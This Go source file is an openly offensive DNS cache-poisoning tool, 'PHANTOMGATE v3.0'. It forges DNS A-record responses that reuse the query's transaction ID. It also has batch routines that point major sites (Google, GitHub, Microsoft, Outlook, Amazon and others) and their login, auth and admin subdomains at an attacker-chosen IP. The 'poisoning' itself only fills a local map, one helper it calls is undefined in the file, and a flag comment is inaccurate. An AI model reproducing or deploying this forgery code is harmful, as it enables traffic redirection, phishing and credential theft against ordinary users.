package dns

import (
	"encoding/binary"
	"fmt"
	"log"
	"math/rand"
	"net"
	"sync"
	"sync/atomic"
	"time"
)

// ══════════════════════════════════════════════════════════════════════════════
// PHANTOMGATE DNS CACHE POISONING v3.0 — POISON DNS RESOLVER CACHE
// ══════════════════════════════════════════════════════════════════════════════

type CachePoisoner struct {
	iface       string
	resolverIP  net.IP
	redirectIP  net.IP
	running     bool
	stopChan    chan struct{}
	
	// Cache entries
	cache       map[string]*CacheEntry
	cacheMu     sync.RWMutex
	
	// Statistics
	stats       *CacheStats
	
	// Configuration
	config      *CacheConfig
}

type CacheEntry struct {
	Domain      string
	IP          net.IP
	TTL         uint32
	ExpiresAt   time.Time
	PoisonedAt  time.Time
	Queries     int64
}

type CacheStats struct {
	QueriesSent    int64
	ResponsesReceived int64
	CacheHits      int64
	CacheMisses    int64
	PoisonsSuccess int64
	StartTime      time.Time
}

type CacheConfig struct {
	Interface   string
	ResolverIP  string
	RedirectIP  string
	TTL         uint32
	ScanRate    time.Duration
	MaxRetries  int
}

func NewCachePoisoner(cfg CacheConfig) (*CachePoisoner, error) {
	if cfg.TTL == 0 {
		cfg.TTL = 3600
	}
	if cfg.ScanRate == 0 {
		cfg.ScanRate = 1 * time.Second
	}
	if cfg.MaxRetries == 0 {
		cfg.MaxRetries = 3
	}
	
	resolverIP := net.ParseIP(cfg.ResolverIP).To4()
	if resolverIP == nil {
		return nil, fmt.Errorf("invalid resolver IP: %s", cfg.ResolverIP)
	}
	
	redirectIP := net.ParseIP(cfg.RedirectIP).To4()
	if redirectIP == nil {
		return nil, fmt.Errorf("invalid redirect IP: %s", cfg.RedirectIP)
	}
	
	return &CachePoisoner{
		iface:      cfg.Interface,
		resolverIP: resolverIP,
		redirectIP: redirectIP,
		stopChan:   make(chan struct{}),
		cache:      make(map[string]*CacheEntry),
		config:     &cfg,
		stats: &CacheStats{
			StartTime: time.Now(),
		},
	}, nil
}

// ══════════════════════════════════════════════════════════════════════════════
// CORE FUNCTIONS
// ══════════════════════════════════════════════════════════════════════════════

func (c *CachePoisoner) Start() error {
	c.running = true
	
	log.Printf("[CACHE] Starting DNS cache poisoner")
	log.Printf("[CACHE] Resolver: %s", c.resolverIP)
	log.Printf("[CACHE] Redirect: %s", c.redirectIP)
	log.Printf("[CACHE] TTL: %d seconds", c.config.TTL)
	
	// Start cache maintenance
	go c.maintenanceLoop()
	
	return nil
}

func (c *CachePoisoner) Stop() {
	c.running = false
	close(c.stopChan)
	
	c.printStats()
	log.Printf("[CACHE] DNS cache poisoner stopped")
}

// ══════════════════════════════════════════════════════════════════════════════
// CACHE POISONING
// ══════════════════════════════════════════════════════════════════════════════

func (c *CachePoisoner) PoisonCache(domain string, ip net.IP, ttl uint32) error {
	c.cacheMu.Lock()
	defer c.cacheMu.Unlock()
	
	entry := &CacheEntry{
		Domain:     domain,
		IP:         ip,
		TTL:        ttl,
		ExpiresAt:  time.Now().Add(time.Duration(ttl) * time.Second),
		PoisonedAt: time.Now(),
	}
	
	c.cache[domain] = entry
	atomic.AddInt64(&c.stats.PoisonsSuccess, 1)
	
	log.Printf("[CACHE] Poisoned cache: %s → %s (TTL: %d)", domain, ip, ttl)
	return nil
}

func (c *CachePoisoner) PoisonMultiple(domains []string, ip net.IP, ttl uint32) {
	for _, domain := range domains {
		c.PoisonCache(domain, ip, ttl)
	}
}

func (c *CachePoisoner) FlushCache() {
	c.cacheMu.Lock()
	defer c.cacheMu.Unlock()
	
	c.cache = make(map[string]*CacheEntry)
	log.Printf("[CACHE] Flushed DNS cache")
}

// ══════════════════════════════════════════════════════════════════════════════
// CACHE LOOKUP
// ══════════════════════════════════════════════════════════════════════════════

func (c *CachePoisoner) Lookup(domain string) (net.IP, bool) {
	c.cacheMu.RLock()
	defer c.cacheMu.RUnlock()
	
	entry, exists := c.cache[domain]
	if !exists {
		atomic.AddInt64(&c.stats.CacheMisses, 1)
		return nil, false
	}
	
	// Check if entry has expired
	if time.Now().After(entry.ExpiresAt) {
		atomic.AddInt64(&c.stats.CacheMisses, 1)
		return nil, false
	}
	
	entry.Queries++
	atomic.AddInt64(&c.stats.CacheHits, 1)
	return entry.IP, true
}

func (c *CachePoisoner) IsPoisoned(domain string) bool {
	_, exists := c.Lookup(domain)
	return exists
}

// ══════════════════════════════════════════════════════════════════════════════
// DNS PACKET FORGERY
// ══════════════════════════════════════════════════════════════════════════════

func (c *CachePoisoner) ForgeResponse(query []byte, responseIP net.IP, ttl uint32) []byte {
	if len(query) < 12 {
		return nil
	}
	
	txnID := binary.BigEndian.Uint16(query[0:2])
	qdCount := binary.BigEndian.Uint16(query[4:6])
	
	if qdCount == 0 {
		return nil
	}
	
	// Parse query name
	queryName, queryEnd := parseDNSNameSimple(query, 12)
	if queryName == "" || queryEnd+4 > len(query) {
		return nil
	}
	
	// Copy question section
	questionSection := query[12:queryEnd+4]
	
	// Build response
	resp := make([]byte, 0, 12+len(questionSection)+16)
	
	// DNS Header
	header := make([]byte, 12)
	binary.BigEndian.PutUint16(header[0:2], txnID)
	binary.BigEndian.PutUint16(header[2:4], 0x8180) // Response, Authoritative
	binary.BigEndian.PutUint16(header[4:6], 1)       // Questions
	binary.BigEndian.PutUint16(header[6:8], 1)       // Answers
	resp = append(resp, header...)
	
	// Question section
	resp = append(resp, questionSection...)
	
	// Answer section
	answer := make([]byte, 16)
	binary.BigEndian.PutUint16(answer[0:2], 0xC00C) // Name pointer
	binary.BigEndian.PutUint16(answer[2:4], 1)       // Type A
	binary.BigEndian.PutUint16(answer[4:6], 1)       // Class IN
	binary.BigEndian.PutUint32(answer[6:10], ttl)
	binary.BigEndian.PutUint16(answer[10:12], 4)     // Data length
	copy(answer[12:16], responseIP.To4())
	resp = append(resp, answer...)
	
	return resp
}

// ══════════════════════════════════════════════════════════════════════════════
// CACHE MAINTENANCE
// ══════════════════════════════════════════════════════════════════════════════

func (c *CachePoisoner) maintenanceLoop() {
	ticker := time.NewTicker(c.config.ScanRate)
	defer ticker.Stop()
	
	for {
		select {
		case <-c.stopChan:
			return
		case <-ticker.C:
			c.cleanExpired()
		}
	}
}

func (c *CachePoisoner) cleanExpired() {
	c.cacheMu.Lock()
	defer c.cacheMu.Unlock()
	
	now := time.Now()
	for domain, entry := range c.cache {
		if now.After(entry.ExpiresAt) {
			delete(c.cache, domain)
			log.Printf("[CACHE] Expired: %s", domain)
		}
	}
}

// ══════════════════════════════════════════════════════════════════════════════
// BATCH POISONING
// ══════════════════════════════════════════════════════════════════════════════

func (c *CachePoisoner) PoisonPopularDomains(ip net.IP, ttl uint32) {
	popularDomains := []string{
		"google.com", "www.google.com", "googleapis.com",
		"github.com", "www.github.com",
		"microsoft.com", "www.microsoft.com",
		"office.com", "www.office.com",
		"outlook.com", "www.outlook.com",
		"live.com", "www.live.com",
		"facebook.com", "www.facebook.com",
		"twitter.com", "www.twitter.com",
		"linkedin.com", "www.linkedin.com",
		"amazon.com", "www.amazon.com",
		"cloudflare.com", "www.cloudflare.com",
	}
	
	c.PoisonMultiple(popularDomains, ip, ttl)
}

func (c *CachePoisoner) PoisonSubdomains(baseDomain string, ip net.IP, ttl uint32) {
	subdomains := []string{
		"www", "mail", "ftp", "smtp", "pop", "imap",
		"admin", "portal", "login", "auth", "api",
		"dev", "test", "staging", "prod",
	}
	
	for _, sub := range subdomains {
		domain := fmt.Sprintf("%s.%s", sub, baseDomain)
		c.PoisonCache(domain, ip, ttl)
	}
}

// ══════════════════════════════════════════════════════════════════════════════
// UTILITY
// ══════════════════════════════════════════════════════════════════════════════

func (c *CachePoisoner) GetCache() map[string]*CacheEntry {
	c.cacheMu.RLock()
	defer c.cacheMu.RUnlock()
	
	cache := make(map[string]*CacheEntry)
	for k, v := range c.cache {
		cache[k] = v
	}
	return cache
}

func (c *CachePoisoner) GetCacheSize() int {
	c.cacheMu.RLock()
	defer c.cacheMu.RUnlock()
	
	return len(c.cache)
}

func (c *CachePoisoner) printStats() {
	log.Printf("[CACHE STATS] Queries: %d | Hits: %d | Misses: %d | Poisons: %d",
		atomic.LoadInt64(&c.stats.QueriesSent),
		atomic.LoadInt64(&c.stats.CacheHits),
		atomic.LoadInt64(&c.stats.CacheMisses),
		atomic.LoadInt64(&c.stats.PoisonsSuccess))
}

func randomIP() net.IP {
	return net.IP{byte(rand.Intn(256)), byte(rand.Intn(256)), byte(rand.Intn(256)), byte(rand.Intn(256))}
}
